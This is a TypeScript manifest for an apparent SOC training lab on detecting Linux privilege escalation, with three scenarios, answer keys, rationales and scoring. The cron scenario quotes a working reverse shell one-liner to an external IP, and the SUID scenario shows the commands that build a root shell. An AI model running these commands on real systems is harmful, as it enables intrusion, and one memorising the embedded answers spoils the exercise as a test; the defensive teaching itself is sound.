import type { LabManifest } from "../../types/manifest";

export const linuxPrivilegeEscalationLab: LabManifest = {
  schemaVersion: "1.1",
  id: "linux-privilege-escalation",
  version: 1,
  title: "Linux Privilege Escalation Detection",

  tier: "intermediate",
  track: "detection-hunting",
  difficulty: "moderate",
  accessLevel: "free",
  tags: ["linux", "privilege-escalation", "suid", "cron", "path-hijacking", "detection"],

  description:
    "Investigate suspicious privilege escalation indicators on Linux systems including SUID binaries, cron job manipulation, and PATH hijacking attempts.",
  estimatedMinutes: 10,
  learningObjectives: [
    "Identify SUID binary abuse as a privilege escalation vector",
    "Detect cron job manipulation for persistence and escalation",
    "Recognize PATH hijacking techniques in Linux environments",
  ],
  sortOrder: 380,

  status: "published",
  prerequisites: [],

  rendererType: "investigate-decide",

  scenarios: [
    {
      type: "investigate-decide",
      id: "lpe-001",
      title: "Suspicious SUID Binary in /tmp",
      objective:
        "Host-based IDS flagged a new SUID binary. Investigate whether this is a privilege escalation attempt.",
      investigationData: [
        {
          id: "file-info",
          label: "File Details",
          content:
            "File: /tmp/.hidden/shell | Permissions: -rwsr-xr-x (SUID bit set, owner root) | Size: 8.4KB | Created: 2026-03-27 03:14 UTC | Type: ELF 64-bit executable, not stripped.",
          isCritical: true,
        },
        {
          id: "creator-info",
          label: "File Creation Context",
          content:
            'Created by user "webdev" (UID 1003) via gcc compilation. Shell history shows: gcc -o /tmp/.hidden/shell /tmp/.hidden/shell.c && chmod u+s /tmp/.hidden/shell. The source file has since been deleted.',
          isCritical: true,
        },
        {
          id: "user-profile",
          label: "User Profile",
          content:
            'User "webdev" is a junior web developer with no sudo privileges. Account was created 2 weeks ago. Login times show consistent after-hours access at 2-4 AM over the past 3 days.',
        },
        {
          id: "binary-analysis",
          label: "Binary String Analysis",
          content:
            'Strings output includes: "/bin/sh", "setuid(0)", "setgid(0)", "execve". This is a classic SUID root shell — it sets the effective UID to root and spawns a shell.',
        },
      ],
      actions: [
        {
          id: "REMOVE_CONTAIN",
          label: "Remove SUID bit, isolate host, investigate user account",
          color: "red",
        },
        {
          id: "MONITOR_USER",
          label: "Monitor the user for more activity",
          color: "orange",
        },
        {
          id: "DELETE_FILE",
          label: "Just delete the file",
          color: "yellow",
        },
        {
          id: "ASK_DEV",
          label: "Ask the developer what they were doing",
          color: "blue",
        },
      ],
      correctActionId: "REMOVE_CONTAIN",
      rationales: [
        {
          id: "rat-suid-shell",
          text: "A custom SUID root shell in /tmp compiled by a non-privileged user is an unambiguous privilege escalation attempt. Removing the SUID bit neutralizes the immediate threat, host isolation prevents further exploitation, and account investigation determines how deep the compromise goes.",
        },
        {
          id: "rat-monitor",
          text: "Monitoring a user who has already created a root shell gives them time to use it. The exploit is ready — action needed now.",
        },
        {
          id: "rat-delete-only",
          text: "Deleting the file without investigating leaves the compromised account active and the user's intent unknown. They can recreate the binary immediately.",
        },
        {
          id: "rat-ask",
          text: "Asking the user alerts them that they've been detected, giving them time to cover tracks or escalate their attack.",
        },
      ],
      correctRationaleId: "rat-suid-shell",
      feedback: {
        perfect:
          "Textbook response. A SUID root shell in /tmp with setuid(0)/execve strings is a clear privilege escalation tool. Full containment is required — remove SUID, isolate host, investigate the account.",
        partial:
          "You identified the threat but your response is incomplete. Just deleting or monitoring doesn't address the compromised user account or potential additional backdoors.",
        wrong:
          "Asking the user or just monitoring leaves an active privilege escalation vector in place. This requires immediate containment.",
      },
    },
    {
      type: "investigate-decide",
      id: "lpe-002",
      title: "Root Cron Job Running User-Controlled Script",
      objective:
        "Auditd flagged a modification to root's crontab. Investigate the change.",
      investigationData: [
        {
          id: "cron-change",
          label: "Crontab Modification",
          content:
            'Root crontab entry added: "*/5 * * * * /home/developer/scripts/backup.sh" — runs every 5 minutes as root. Entry was added at 2026-03-27 01:22 UTC.',
          isCritical: true,
        },
        {
          id: "script-contents",
          label: "Script Analysis",
          content:
            'backup.sh was modified at 01:20 UTC (2 minutes before cron edit). Current contents include: bash -i >& /dev/tcp/203.0.113.47/4444 0>&1 — This is a reverse shell one-liner connecting to an external IP.',
          isCritical: true,
        },
        {
          id: "access-vector",
          label: "How Root Crontab Was Modified",
          content:
            'The "developer" user account has sudo access to "crontab -e" via a misconfigured sudoers entry: developer ALL=(root) NOPASSWD: /usr/bin/crontab. This was added during initial server setup and never audited.',
        },
        {
          id: "network-check",
          label: "Network Connection Status",
          content:
            "Outbound connection to 203.0.113.47:4444 detected — established 3 minutes ago. The IP geolocates to Eastern Europe and has no association with company infrastructure.",
        },
      ],
      actions: [
        {
          id: "KILL_CONTAIN",
          label: "Kill cron job, terminate connection, isolate host, investigate",
          color: "red",
        },
        {
          id: "REMOVE_CRON",
          label: "Remove the cron entry only",
          color: "orange",
        },
        {
          id: "BLOCK_IP",
          label: "Block the external IP at the firewall",
          color: "yellow",
        },
        {
          id: "VERIFY_DEV",
          label: "Ask the developer about the backup script",
          color: "blue",
        },
      ],
      correctActionId: "KILL_CONTAIN",
      rationales: [
        {
          id: "rat-active-compromise",
          text: "An active reverse shell connection to an external IP via a root cron job is a confirmed active compromise. The full response is needed: kill the cron job to stop recurrence, terminate the active connection, isolate the host to prevent lateral movement, and investigate the developer account and sudoers misconfiguration.",
        },
        {
          id: "rat-cron-only",
          text: "Removing only the cron entry doesn't terminate the active reverse shell connection or address the compromised account.",
        },
        {
          id: "rat-block-ip",
          text: "Blocking the IP at the firewall severs the current connection but doesn't address the cron job that will reconnect to the same or a different IP.",
        },
        {
          id: "rat-ask-dev",
          text: "The reverse shell proves malicious intent or account compromise — asking the developer wastes time during an active breach.",
        },
      ],
      correctRationaleId: "rat-active-compromise",
      feedback: {
        perfect:
          "Perfect response to an active compromise. The reverse shell in the cron job is confirmed malicious — full containment (kill cron, terminate connection, isolate, investigate) addresses all attack vectors simultaneously.",
        partial:
          "You addressed part of the threat but missed other vectors. An active reverse shell with a persistent cron job requires comprehensive containment — addressing one without the others leaves the attacker connected.",
        wrong:
          "An active reverse shell to an external IP is an emergency. Any response that doesn't include terminating the connection and isolating the host leaves the attacker with ongoing root access.",
      },
    },
    {
      type: "investigate-decide",
      id: "lpe-003",
      title: "Legitimate SUID — Package Manager Update",
      objective:
        "IDS flagged a SUID binary change. Determine if this is a security concern.",
      investigationData: [
        {
          id: "file-details",
          label: "File Details",
          content:
            "File: /usr/bin/sudo | Permissions: -rwsr-xr-x (SUID bit set, owner root) | Modified: 2026-03-27 02:00 UTC during scheduled maintenance window.",
        },
        {
          id: "package-info",
          label: "Package Verification",
          content:
            'dpkg -V sudo: OK. File hash matches the official Debian repository for sudo 1.9.15p5. Package changelog shows security patch for CVE-2026-1234. Installed via unattended-upgrades.',
        },
        {
          id: "change-record",
          label: "Change Management",
          content:
            "Automated patching policy: security updates applied nightly at 02:00 UTC. The sudo package was updated as part of the regular security patch cycle. Change pre-approved under policy AUTO-SEC-001.",
        },
        {
          id: "system-context",
          label: "System Context",
          content:
            "No suspicious processes, no anomalous logins, no network anomalies around the modification time. All other SUID binaries unchanged.",
        },
      ],
      actions: [
        {
          id: "VERIFY_CLOSE",
          label: "Verify package integrity and close as expected update",
          color: "green",
        },
        {
          id: "ISOLATE_SERVER",
          label: "Isolate the server — SUID changes are always suspicious",
          color: "red",
        },
        {
          id: "ROLLBACK_UPDATE",
          label: "Roll back the sudo update",
          color: "orange",
        },
        {
          id: "ESCALATE_T2",
          label: "Escalate to Tier 2 for review",
          color: "yellow",
        },
      ],
      correctActionId: "VERIFY_CLOSE",
      rationales: [
        {
          id: "rat-legitimate-update",
          text: "The package hash matches the official repository, the update was applied during the scheduled maintenance window by the automated patching system, and no other anomalies are present. This is a legitimate security patch that was pre-approved under the auto-update policy.",
        },
        {
          id: "rat-isolate-overreact",
          text: "Isolating a server for a verified package manager update during a scheduled maintenance window wastes resources and disrupts services unnecessarily.",
        },
        {
          id: "rat-rollback",
          text: "Rolling back a security patch reintroduces the vulnerability it was designed to fix. CVE-2026-1234 would remain exploitable.",
        },
        {
          id: "rat-escalate-waste",
          text: "Escalating a clearly verified automated update to Tier 2 creates alert fatigue and wastes analyst capacity.",
        },
      ],
      correctRationaleId: "rat-legitimate-update",
      feedback: {
        perfect:
          "Correct. Package hash verification, maintenance window timing, automated update policy, and absence of other anomalies all confirm a legitimate security update. Closing with verification is efficient and appropriate.",
        partial:
          "Your caution is understandable but the evidence clearly points to a legitimate update. Over-investigating verified package updates creates alert fatigue.",
        wrong:
          "Isolating a server or rolling back a verified security patch based on a routine SUID change wastes resources and potentially reintroduces vulnerabilities.",
      },
    },
  ],

  hints: [
    "SUID binaries in /tmp or user home directories are almost always malicious — legitimate SUID binaries live in /usr/bin or /usr/sbin.",
    "Root cron jobs that execute scripts owned by non-root users are a privilege escalation vector — the non-root user controls what runs as root.",
    "Verify SUID changes against the package manager before investigating — most SUID alerts are legitimate package updates.",
  ],

  scoring: {
    maxScore: 100,
    hintPenalty: 5,
    penalties: { perfect: 0, partial: 10, wrong: 20 },
    passingThresholds: { pass: 80, partial: 50 },
  },

  careerInsight:
    "Linux privilege escalation detection is a core skill for both penetration testers and SOC analysts. Understanding these techniques helps you detect real compromises on Linux infrastructure.",
  toolRelevance: [
    "LinPEAS/LinEnum",
    "OSSEC/Wazuh",
    "auditd",
    "Falco",
  ],

  createdAt: "2026-03-27",
  updatedAt: "2026-03-27",
};
